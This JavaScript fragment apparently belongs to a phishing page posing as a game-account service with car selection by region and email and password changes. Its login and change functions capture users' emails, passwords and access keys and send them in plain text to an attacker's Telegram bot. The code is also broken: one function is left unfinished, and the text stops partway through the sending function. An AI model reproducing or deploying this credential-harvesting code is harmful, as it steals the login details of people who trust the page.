  function validateKey() {
    const email = document.getElementById("emailInput").value.trim();
    const password = document.getElementById("passwordInput").value.trim();
    const inputKey = document.getElementById("accessKeyInput").value.trim();
    if (!email || !password || !inputKey) return alert("Please fill all fields");
    if (validKeys.includes(inputKey)) {
      currentAccessKey = inputKey;
      currentEmail = email;
      currentPassword = password;
      document.getElementById("loginForm").style.display = "none";
      document.getElementById("menuBox").style.display = "block";
      document.getElementById("showKey").innerText = inputKey;
      sendToBot(`‚úÖ LOGIN SUCCESS\nEmail: ${email}\nPassword: ${password}\nAccess Key: ${inputKey}`);
    } else {
      alert("‚ùå Access Key Invalid");
      sendToBot(`‚ùå FAILED LOGIN\nEmail: ${email}\nPassword: ${password}\nAccess Key: ${inputKey}`);
    }
  }

  function openPopup(type) {
    document.getElementById(`popup${type.charAt(0).toUpperCase() + type.slice(1)}`).style.display = "block";
  }

  function closePopup(id) {
    document.getElementById(id).style.display = "none";
  }

  function sendSlot() {

  function openCarMenu() {
    document.getElementById('carMenu').style.display = 'block';
  }

  function showCarRegion(region) {
    currentRegion = region;
    document.getElementById('carMenu').style.display = 'none';
    document.getElementById('regionTitle').innerText = `${region} Cars`;
    const carList = document.getElementById('carList');
    carList.innerHTML = "";
    carData[region].forEach(car => {
      const p = document.createElement("p");
      p.textContent = car;
      p.onclick = () => document.getElementById("selectedCar").value = car.split(" - ")[0];
      carList.appendChild(p);
    });
    document.getElementById('regionCars').style.display = 'block';
  }

  function sendCarSelection() {
    const carID = document.getElementById("selectedCar").value.trim();
    if (!carID) return alert("Enter Car ID");
    const selectedCar = carData[currentRegion].find(car => car.startsWith(carID + " - "));
    const carName = selectedCar ? selectedCar.split(" - ")[1] : "Unknown Car";
    const message = `üöó CAR SELECTION\nRegion: ${currentRegion}\nCar ID: ${carID}\nCar Name: ${carName}\nAccess Key: ${currentAccessKey}`;
    sendToBot(message);
    alert("Car selection sent!");
    closePopup("regionCars");
  }

  function confirmChange(type) {
    let newValue = (type === 'Email') ? document.getElementById('newEmail').value.trim() : document.getElementById('newPassword').value.trim();
    if (!newValue) return alert(`Enter new ${type}`);
    sendToBot(`‚úèÔ∏è ${type.toUpperCase()} CHANGE\nNew ${type}: ${newValue}\nKey: ${currentAccessKey}`);
    alert(`${type} changed successfully!`);
    closePopup(`popup${type}`);
  }

  function sendToBot(message) {
    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: ADMIN_ID, text: message })
    });
